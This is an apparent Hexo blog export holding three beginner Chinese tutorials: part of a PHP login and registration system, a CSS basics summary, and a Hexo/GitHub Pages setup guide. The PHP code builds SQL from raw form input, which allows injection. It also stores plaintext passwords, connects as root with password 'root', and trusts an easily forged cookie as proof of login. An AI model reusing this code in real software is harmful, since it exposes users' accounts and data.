找到问题所在就可以成功设置好cookie，并且注销cookie了。 四：实现登陆功能和注销cookie在上面我们实现了两个页面，一个是登陆页面，一个连接数据库+cookie的，下面我们还需要两个页面。一个登陆失败页面（fail.php）代码如下： 1234567891011121314151617&lt;?php?&gt; &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; &lt;title&gt;登陆失败&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"2.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;请重新登陆&lt;/h1&gt; &lt;/div&gt; &lt;a href=\"login.php\"&gt;重新登陆&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 可以看logincookie.php的代码中，如果用户名和密码有一个不正确的时候，都会跳转到fail.php页面。实现效果：下面我们再实现一个用户登陆成功的页面（welcome.php）代码如下：1234567891011121314151617181920&lt;?php if(!isset($_COOKIE['username']))&#123;//如果cookie没有设置，则不能登陆。 echo '不能登陆'; exit(); &#125;?&gt;//上面的代码便是设置cookie的作用便用于此，这样便可防止直接登入后台&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请登陆&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"4.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Landingsuccessfully\"&gt; &lt;h1&gt;Landingsuccessfully&lt;/h1&gt; &lt;a href=\"end.php\"&gt;Please cancel&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 实现效果：直接从url里面登陆，显示结果：正常用户登陆，显示结果：因为我设置的cookie是一个小时的，我们需要手动清除一下cookie，否则客户端会保留cookie，下次在url里直接可以登陆后台。 所以再写一个注销cookie的页面（end.php）代码如下：12345678&lt;?php ini_set(\"error_reporting\",\"E_ALL &amp; ~E_NOTICE\"); header('Content-type:text/html;charset=utf-8');if (isset($_COOKIE['username'])) &#123; setcookie('username',$userName,time()-3600); echo '注销成功';&#125;?&gt; 之前这个页面老是报错，大致便是Notice:Undefined varialbe:变量名称，但注销功能能正常实现，加上 ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); 便可以解决报错问题，查资料发现。在4.3.0中运行正常，在4.3.1中运行会提示Notice:Undefined varialbe:tmp_i修改方法：在程序开头加一句：error_reporting(E_ALL &amp; ~E_NOTICE); 或error_reporting(E_ALL ^ E_NOTICE);具体查看：报错原因和修改方法 这样就实现了cookie注销的功能了实现效果 ：进行一下测试，看是否清除cookie。在url地址栏里直接登陆后台试试ok,看来确实注销成功了，完成咯。 五：实现注册功能登陆功能也完全实现了，接下来我们就实现一下注册功能。这里我们又写了三个页面（好乱），不过毕竟是小白，只要能写出来就行。首先是注册页面（Register.php）代码如下： 1234567891011121314151617181920&lt;?php?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;请注册&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"3.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"Register\"&gt; &lt;h1&gt;Register&lt;/h1&gt; &lt;form action=\"Register link.php\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"请输入用户名\" /&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"请输入密码\" /&gt; &lt;br /&gt; &lt;button class=\"zc\" type=\"submit\"&gt;注册&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 接下来是连接数据库(linkmysql.php)代码如下：123456&lt;?php header(\"Content-type: text/html; charset=utf-8\");//设置编码,防止乱码 $con = mysql_connect(\"localhost\",\"root\",\"root\") or die(\"数据库连接失败\"); mysql_select_db('login') or die(\"指定的数据库不能打开\"); mysql_query(\"set names utf8\");?&gt; 再就是导入信息的页面（Register link.php）代码如下：123456789101112131415161718192021222324252627282930&lt;?php require_once(\"linkmysql.php\");//首先连接数据库 $name=trim($_POST['username']); //trim函数，过滤空格，使用trim函数，我们可以把表单中空格给过滤掉 $password=$_POST['password']; $sql = \"select * from user where username='$name'\";//从数据库查找用户名数据 $info = mysql_query($sql);//函数执行一条 MySQL 查询 $res = mysql_num_rows($info);//返回一行的结果 if(empty($name))&#123;//empty() 函数用于检查一个变量是否为空。 echo \"&lt;script&gt;alert('用户名不能为空');location.href='login.php';&lt;/script&gt;\"; &#125;else if(empty($password))&#123; echo \"&lt;script&gt;alert('密码不能为空');location.href='login.php';&lt;/script&gt;\"; &#125;else&#123; if($res)&#123; echo \"&lt;script&gt;alert('用户名已存在');location.href='login.php';&lt;/script&gt;\"; &#125;else&#123; $sql1 =\"insert into user(username,password) values('\".$name.\"','\" .$password.\"')\";//PHP MySQL 插入数据 $result = mysql_query($sql1);//判断插入数据是否成功 if($result)&#123; echo \"&lt;script&gt;alert('注册成功')&lt;/script&gt;\"; header('Location:login.php'); &#125;else&#123; echo \"&lt;script&gt;alert('注册失败')&lt;/script&gt;\"; &#125; &#125;&#125; ?&gt; 这样就实现了注册功能。这里面涉及了数据库的PHP mySQL插入的语法，可以在菜鸟教程学习，之后再写一篇总结一下这些语句的用法。 🆗，到此为止我们就实现了简易的登陆注册页面。 虽然这个项目很小，但做出了真的很有成就感，同时觉得学习的东西真的好有意思，加油，继续努力学习（开心！！！）。","categories":[],"tags":[{"name":"HTML","slug":"HTML","permalink":"http://bealright.github.io/tags/HTML/"}]},{"title":"CSS学习总结","slug":"CSS学习总结","date":"2019-03-18T06:38:24.000Z","updated":"2019-06-07T07:53:47.409Z","comments":true,"path":"2019/03/18/CSS学习总结/","link":"","permalink":"http://bealright.github.io/2019/03/18/CSS学习总结/","excerpt":"","text":"CSS学习总结CSS定义及三种引入方式 CSS是一种层叠样式表直接放在div标签里面 第一种：内敛样式表12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"color:red;width:100px;height:100px;\"&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第二种：内部样式表 在里面引用标签要建立联系 需要一个选择器123&lt;style&gt;选择器&#123;选择器的内容&#125;&lt;/style&gt; 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;style&gt; div &#123;color: red;width: 100px;height: 100px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第三种：外部样式表 用一个文件 将这些属性放在文件里面例如：建立一个1.css文件 在新建的文件中放入：12345 div &#123;color: red;width: 100px;height: 100px;&#125; 把这些放入这个文件中在原来的文件里引用标签 href属性填入新建的CSS文件1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 实现结果： CSS语法外部样式表 选择器 { 属性名称：属性值；}12css注释方法：/*注释*/ 颜色rgb色彩模式：R 红色 由浅到深 0—255G 绿色b 蓝色 例如：12345div &#123; width: 100px; height: 100px； color: rgb(225,0,0)；&#125; 同样也可以用百分比进行替换如：12345div &#123; width: 100px; height: 100px； color: rgb(100%,0%,0%)；&#125; 第二种:用颜色名称除此之外，还可以用十六进制代表颜色例如：1234567891011 &lt;p style=\"background-color:#FFFF00\"&gt;16进制&lt;/p&gt;&lt;p style=\"background-color:rgb(255,255,0)\"&gt;RGB&lt;/p&gt;&lt;p style=\"background-color:yellow\"&gt;颜色名称&lt;/p&gt; 实现结果： CSS基本选择器 选择器的作用：通过选择器 可以找到HTML的元素 并且把选择器后面样式传递给元素。四大类选择器：基本选择器组合选择器属性选择器伪元素选择器 基本选择器一 通配符选择器二 标签选择器 比如div三 id 选择器四 class选择器 一：通配符选择器1234*&#123; border: 1px solid balck;&#125;&lt;!--* 可以选择所有的html标签--&gt; 例如：在CSS.html文件中12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"2.css\"&lt;/head&gt;&lt;body&gt; &lt;div&gt;div1 &lt;div&gt;div2&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 在2.CSS文件里123*&#123; border: 1px solid black; &#125; 这是外部样式表实现结果为：二：标签选择器例如：我只选择标签在2.CSS文件中123p&#123; border: 1px solid black; &#125; 实现结果：三：id选择器在CSS.html中123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"2.css\"&lt;/head&gt;&lt;body&gt; &lt;div&gt;div1 &lt;div&gt;div2&lt;/div&gt; &lt;p id=\"wo\"&gt;p1&lt;/p&gt; &lt;!--id后面取一个名称--&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在2.CSS中123456#wo &#123; font-size: 60px; &#125;&lt;!--#加上名称就会选择对应的标签，一一对应--&gt;注意事项：&lt;!--id名称不要在一个文件里重复出现--&gt; 实现结果：四：class标签1234567在CSS.html中&lt;p class=\"wo\"&gt;p2&lt;/p&gt;在2.CSS中.wo &#123; font-size: 60px; &#125;&lt;!-- .就代表了class--&gt; 实现结果：12345678910&lt;!--class标签不具有唯一性--&gt;在CSS.html中&lt;p class=\"wo wo2\"&gt;p2&lt;/p&gt;在2.CSS中.wo &#123; font-size: 60px; &#125;.wo2 &#123; color: red;&#125; CSS原理 优先原则后解析的内容 会覆盖掉之前解析的内容 1.对于同一个选择器：文件执行的顺序是从上往下执行。例如：1234div&#123; color：red; color: green;&#125; 最终文本的颜色是绿色 2.同一类型的选择器：从上往下例如：1234567891011在创建html文件中&lt;body&gt; &lt;div&gt;div1&lt;/div&gt;&lt;/body&gt;在创建CSS文件中div &#123; background-color: red;&#125;div &#123; background-color: green;&#125; 最终的背景色显示是绿色1234567891011在创建的html文件中&lt;body&gt; &lt;div class=\"bg1 bg2\"&gt;div1&lt;/div&gt;&lt;/body&gt;在创建CSS文件中.bg1&#123; background-color: yellow;&#125;.bg2&#123; background-color: green;&#125; 最终显示的背景色是绿色 3.不同类型的选择器：选择器本身具有优先级如：*&lt;div&lt;class&lt;id规则：先解析 低优先级的再解析高优先级的1234567891011在创建的html文件中&lt;body&gt; &lt;div class=\"bg1\"&gt;div1&lt;/div&gt;&lt;/body&gt;在创建的CSS文件中.bg1&#123; background-color: green;&#125;div&#123; background-color:red;&#125; 最终div1的背景色是绿色4.外部样式 内部样式 合并之后一起解析先外部样式 再内部解析例如：12345678910111213例如在html文件中&lt;style&gt;div &#123; background-color: red;&#125;&lt;/style&gt;在CSS文件中div&#123; background-color:yellow;&#125;div &#123; background-color: green;&#125; 先合并起来在按照同一类型的选择器：从上往下执行。最终显示的背景色是红色 5.加了important 字段的，最后再执行.12345678div&#123; background-color: green! important;&#125;最后再执行。div &#123; background-color: yellow; font-size: 30px;&#125; 继承原则嵌套里面的标签 拥有外部标签的某些样式 跟文字、文本相关的样式是可以被继承123456789101112&lt;body&gt; &lt;div class=\"txt\"&gt;div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;在CSS文件中div.txt &#123; color: red;/* 文字的颜色*/&#125; &lt;!--跟文本 文字相关的内容会继承CSS文件中的颜色--&gt; CSS组合选择器 把基本选择器通过特殊的符号串在一起，形成一定的意义。 分组选择器用逗号将标签隔开1234567891011121314在html中&lt;body&gt; &lt;div&gt;div1&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中div &#123; background: green;&#125;p &#123; background: green; color: red; font-size: 50px;&#125; 为了节省代码量，可以使用分组选择器，实现相同的效果1234567div,p &#123; background：green; color: red;&#125;p &#123; font-size: 50px;&#125; 嵌套选择器空格隔开例如 : p是嵌套在div里面1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div p&#123; background: green; color: red; font-size: 50px;&#125; p2 p3都会显示出这些属性，而p1不会,因为p1没有嵌套在div标签内。 子选择器标签&gt;标签例如：1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div&gt;p&#123; background: green; color: red; font-size: 50px;&#125; 因为p2的父标签是div，所以CSS的属性可以实现，p3,p1的父标签不是,所以不能实现CSS中的属性。 相邻同级选择器例如：1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div+p&#123; background: green; color: red; font-size: 50px;&#125; 可以看到div和 最下面的p标签同级，因此只有p1这个p标签会生效 CSS属性选择器基本选择器【属性】 123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS文件中P[title=wo]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：只有p1显示出CSS的属性 属性里面的值可以放多个【属性~=值】代表多个值123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title~=wo]&#123; background: green; color: red; font-size: 50px;&#125; 只要title包含有wo的就生效。因此只有p1生效 【属性^=值】 开始123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title^=wo]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：title的值是以wo开头的，所以p3 p1都会生效 【属性$=值】 结束123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title$=cc]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：因为p3 p1 title属性的结尾都是CC，故p3和p1都会实现CSS中的属性 伪元素选择器 不是自己写的HTML文件中自带开始：before结束：after 12345678910111213141516在HTML文件中&lt;body&gt; &lt;p title=\"wo cc\"&gt; &lt;!--&lt;before&gt;--&gt;隐藏的 p1 &lt;!--&lt;after&gt;--&gt; &lt;/p&gt;&lt;/body&gt;在CSS文件中可以改变内容，添加样式p::before &#123; content: \"before\";&#125;p::after &#123; content: \"after\";&#125; 实现的结果为：before p1 after 块元素 第一个字母 first-letter 第一行： first-line 1234567891011在html文件中&lt;body&gt; &lt;p&gt; 这是一段文字 &lt;/p&gt;&lt;/body&gt;在CSS文件中p::first::letter &#123; color: red; font-size: 100px;&#125; 实现结果:第一个字变红放大12345同理p::first::line&#123; color: red; font-size: 100px;&#125; 实现结果:这一段文字变红放大 CSS背景12345在CSS文件中body &#123; background-color: red;//添加背景颜色 background-image: url('图片地址')；//添加背景图片&#125; 实现结果：一个图片是重复铺满整个网页也可以设置平铺的方向1234567body &#123; background-color: red; background-image: url(''); background-repeat: repeat-x//图片沿着X方向平铺 background-repeat: repeat-y//图片沿着T方向平铺 background-repeat: no-repeat;// 只有一张图片，不会进行平铺&#125; 在网页中移动图片12345body &#123; x 轴 y轴 background-position: 100px 100px;也可以表示为 background-position: 50% 0%；&#125; 同样也可以这样12345x轴： left center righty轴： top center bottombody &#123; background-position: center top;&#125; 设置图片不滚动123body &#123; background-attachement: fixed;&#125; 这样背景图片就会保持不动，如果不设置则默认为滚动。 也可以写成这样1background: color image repeat attachment position 按照这样的顺序，就可以节省很多代码量例如：1background: red url('') repeat-y; CSS字体设置字体在CSS文件中 1234567body &#123; font-family: \"黑体\"，\" 宋体\"；//多个字体的话用逗号隔开 font-size: 30px;//设置字体大小，如果不设置系统默认是16px的 font-weight: 100~900//设置字体粗细 &lt;!--一般情况下是不会写数字的，用三个单词代替，分别为normal\\lighter（字号更细）\\bold(字号更粗) font-style: normal;(正常的字体) italic(斜体)&#125; 上面的代码也可以用一行代码进行表示12345678body &#123; font: style weight size/line-height font-family&#125;例如;body &#123; font: italic bold 30px/150px \"微软雅黑\"，\"黑体\"；&#125;line-height：字体的行高 CSS文本设置字符的间距 12345678910&lt;body&gt; &lt;p class=\"txt\"&gt;hello world 这是第一段字&lt;/p&gt;&lt;/body&gt;在CSS文件中.txt &#123; letter-spacing: 0px; &lt;!-- 像素也可以设置为负的--&gt;&#125; 这样就可以设置字符的间距 设置空格的距离1234567891011在html文件中&lt;body&gt; &lt;p class=\"txt\"&gt;hello world 这是第一段字&lt;/p&gt;&lt;/body&gt;在CSS文件中.txt &#123; word-spacing: 0px; &lt;!-- 像素也可以设置为负的--&gt;&#125; 这样就可以设置空格的距离还有一个方法设置字符的间距1direction: ltr; &lt;!--ltr代表的意思即为 left to right--&gt; 在CSS文件中123456 p &#123; text-decoration: line-through; &lt;!--线穿过文字--&gt; overline;&lt;!--线在文字上方--&gt; underline;&lt;!--线在文字下方--&gt;&#125; 例如;123p &#123; text-decoration: line-through;&#125; 文字对齐方式 center(居中对齐) left(左对齐) right(右对齐) justify(两端对齐)默认状态下就是左对齐例如：1234在CSS文件中p &#123; text-align: left;&#125; 这样html文件中p标签的内容便会左对齐 缩进设置123p &#123; text-indent: 60px;&#125; 英语大小写字母设置12345678p &#123; text-transform: uppercase; &lt;!--uppercase是改为全大写--&gt; text-transform: lowercase; &lt;!--lowercase是改为全小写--&gt; text-transform: capitalize; &lt;!--capitalize是改为首字母大写--&gt;&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://bealright.github.io/tags/CSS/"}]},{"title":"搭建属于自己的博客","slug":"hexo+githup搭建属于自己的博客","date":"2019-03-12T01:34:24.000Z","updated":"2019-06-07T07:53:24.993Z","comments":true,"path":"2019/03/12/hexo+githup搭建属于自己的博客/","link":"","permalink":"http://bealright.github.io/2019/03/12/hexo+githup搭建属于自己的博客/","excerpt":"","text":"hexo+githup搭建属于自己的博客 第一次搭建博客，遇到不少坑。CSDN、bing、谷歌、百度上都有大神的博客教授如何一步一步搭建属于自己的博客。不过我毕竟属于小白，文字有时给我的感受不是那么的直观，所以我是在B站看视频一步一步做的.话说他们的视频都写无坑视频。。。我却遇到了。。。很多坑，但觉得也很有趣，所以记录一下我的搭建过程。 安装node.js 官网链接选择10.15.3LTS进行下载。我是一路next,我开始搭的时候不想放入C盘，但后来发现npm命令不能用😂，才发现还要改路径，很麻烦。所以就一路next放进C盘中去。安装好后，打开cmd 12C:\\Users\\用户名&gt;node -vv10.15.3 即证明已经安装好了。 2 创建github账户 github官网username不要起中文名，起一个英语名字，也不要太过于长，否则都后面会很麻烦。创建完成后点击start a project,创建一个仓库。Repository name 要写成这样的格式username.github.io,例如我用户名创建时bealright.github.io,然后将Initialize this repository with a README前面的对勾打上。点击create repository就创建好了。接下你可以测试一下，点击create new file.,输入index.html，输入&lt;h1&gt; Hello Github &lt;/h1&gt;.然后提交。复制你的链接用户名.github.io，然后转到该页面上去。如果显示出Hello Github，证明你创建的已经成功。如果显示404（所请求的页面不存在或已被删除!），不要着急，我当时被困在这里，毕竟刚开始搭，什么都不懂。在这里一直查怎么回事，删除仓库，重新建库。。。😂😂，到最后我明白了一个真理。。。时间skr伟大的作者，他必将写出最完美的结局 解决方法：问题出在Github服务器上，估计是翻墙什么的缘故吧，会卡一些，你创建的文件不会立即上传过去，要做的就是好好睡一觉明天在搭（因为我是晚上搭的😂），所以遇到这个问题不要着急。 3 安装git for windows git for windows官网因为git for windows是输入外国网站，你必须翻墙去下载，但是速度会特别慢，所以推荐去百度网盘什么的下载，会快一些。我当时找了一个很不错的网址，各种版本的都有。下载地址安装时一路next,我直接放在的C盘中，因为如果出现路径问题会很麻烦，你还得去设置环境变量。在安装的时候，其中有一步要选择Use windows default console window。安装好后打开cmd。输入git 命令。 12345678910111213141516171819202122232425262728293031323334353637383940414243C:\\Users\\赵志豪&gt;gitusage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value] [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path] [-p | --paginate | --no-pager] [--no-replace-objects] [--bare] [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;] &lt;command&gt; [&lt;args&gt;]These are common Git commands used in various situations:start a working area (see also: git help tutorial) clone Clone a repository into a new directory init Create an empty Git repository or reinitialize an existing onework on the current change (see also: git help everyday) add Add file contents to the index mv Move or rename a file, a directory, or a symlink reset Reset current HEAD to the specified state rm Remove files from the working tree and from the indexexamine the history and state (see also: git help revisions) bisect Use binary search to find the commit that introduced a bug grep Print lines matching a pattern log Show commit logs show Show various types of objects status Show the working tree statusgrow, mark and tweak your common history branch List, create, or delete branches checkout Switch branches or restore working tree files commit Record changes to the repository diff Show changes between commits, commit and working tree, etc merge Join two or more development histories together rebase Reapply commits on top of another base tip tag Create, list, delete or verify a tag object signed with GPGcollaborate (see also: git help workflows) fetch Download objects and refs from another repository pull Fetch from and integrate with another repository or a local branch push Update remote refs along with associated objects'git help -a' and 'git help -g' list available subcommands and someconcept guides. See 'git help &lt;command&gt;' or 'git help &lt;concept&gt;'to read about a specific subcommand or concept. 出现一堆看不懂的就证明已经安装成功了。 4 配置githubSSH 找到下载git fow windows的目录，打开git-bash.exe在命令行输入$ ssh-keygen -t rsa -C &quot;你的邮箱&quot;输入之后，一直按回车就🆗了。等到出现一个长方形框之后，就已经配置好了。然后打开GitHub官网，点击头像，点击Settings,再点击SSH and GOG keys,点击NEW SSH KEY ,这时title就起名为你注册的用户名，然后key需要你找到C:\\Users\\用户名\\.ssh这个目录，注意这里用记事本打开id_rsa.pub,复制里面的代码，粘贴到key上即可。这样就配置好了。 5 hexo本地使用 进入hexo官网注意 这是安装hexo不要在安装到c盘了，因为c盘系统文件太多，不敢乱删，而且找hexo所在文件也不太好找到。我是在D盘建了一个blog文件夹，将hexo安装在这里面。接下来打开cmd 12345C:\\Users\\用户名&gt;D:D:\\&gt;cd blogD:\\blog&gt;npm install hexo-cil -g 首先你得先进入对应的目录，然后输入npm install hexo-cil -g命令即可安装hexo.接下来照着这些命令往下走，第二条命令作用是初始化。最好第二条命令 hexo init 博客名（注册的名字），这样好区分一点。 1INFO start 博客名 with Hexo! 显示出这个时，初始化已完成。 12cd 博客名npm install 待安装好后，本地运行一下，看是否成功。输入1hexo s 显示出 123D:\\blog\\bealright&gt;hexo sINFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. 打开http://localhost:4000/，如果出现这个画面，恭喜创建成功。![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/photo/7.png?raw=true)因为换了主题的缘故，所以不再是hexo的官方主题，不过只要出现画面就成功了。 六 安装sublime sublime官网下载这个软件有很大用处，无需在记事本了修改配置文件，直接在sublime里修改更方便一些。不过下载这个也要翻墙，所以推荐百度网盘下载。下载好后，找到你安装hexo的目录直接拖进sublime里。就会显示出类似这个的图片。 七 hexo发布到github上 这是最后一步了，看似是胜利女神在向你招手，但你永远也不会知道前面是结束还是会继续掉坑。打开sublime,找到这个然后将最下面的代码改为这样注意： repo里的bealright是我的用户名，改成注册时的用户名就好了。还有一处地方也需要改照这这个格式，把自己的用户名更改了即可（bealright是我自己的用户名）。再打开cmd,输入 123456789hexo gINFO Start processingINFO Files loaded in 124 msINFO Generated: archives/2019/index.htmlINFO Generated: archives/index.htmlINFO Generated: archives/2019/03/index.htmlINFO Generated: index.htmlINFO Generated: 2019/03/16/cmd中操作数据库的那些常见命令/index.htmlINFO 5 files generated in 254 ms 会出现类似的东西（我的创建完成所以会不一样），不要管他。继续输入 1hexo d 此时会出现 1ERROR Deployer not found git 原因在于还少了一个插件到官网下载插件进入hexo文档官网hexo文档官网将命令输入到cmd中即可安装。会有一点慢，等待一会就好。安装好之后，输入 1hexo d 这一步就要看你运气了，我在这里卡了一个晚上 + 一个下午😂。如果出现这个的话恭喜你，运气很好（哈哈），接下只需要输入 12345git config --global user.email \"你的邮件\"回车git config --global user.name \"你的用户名\"再次输入 hexo d会弹出这样的窗口 输入即可进入你的博客了。（好幸运呀）但我遇到的是这样的😤马上就成功了，前面却是这个，好让人心急。不过不要着急，互联网这么强大，大佬那么多，总会有解决方法。冷静下来进行分析。咦，发现问题了。原来是git命令不能用，查了很多文章，我找到了二个解决方法。一：把git for windows 给卸载了重新安装，上文说之所以安装git for windows一路next 不要换路径原因就在这。还有一个就是在这里面输入这里面自带git命令，123重新输入hexo ghexo d 不过让人郁闷的是😱这个git命令解决后。。。还有问题。。。（我要郁闷死😭）同寝室人一个坑没掉过，我一路跌坑。请看新问题。。。我。。。不会吧，又出现这个问题。。。怎么办，都到最后一步了。不放弃继续查，bing\\谷歌\\百度各种查，问学长学姐，加hexo群询问。。。😥不过在耐心快被磨完时，我找到解决方案了。这就是解决方案。当时也不太理解，不过得去尝试，不去尝试怎么知道行不行。首先将删除新建一个文件夹然后下载把下载的内容放在你新建的文件夹里面。再次运行 12hexo ghexo d 当时的心情是快点好吧，大哥求你了😂结果奇迹出现了只不过我的和其他人登陆有点不一样。。。输入的账号，密码全对，结果。。。崩溃的边缘。。。我实在无语，然后输入了自己的用户名bealright（没事的）。。。我遇到的都是事😂突然弹出一个窗口输入密码后，成功了。。。这个过程完成后，感悟真的很多。也许前方无数的bug\\error在等着我，但是只要保持耐心，不断努力，最终会解决他们的。共勉一句我特别喜欢的英语名言No attempt, no success没有尝试，没有成功","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://bealright.github.io/tags/hexo/"}]}]}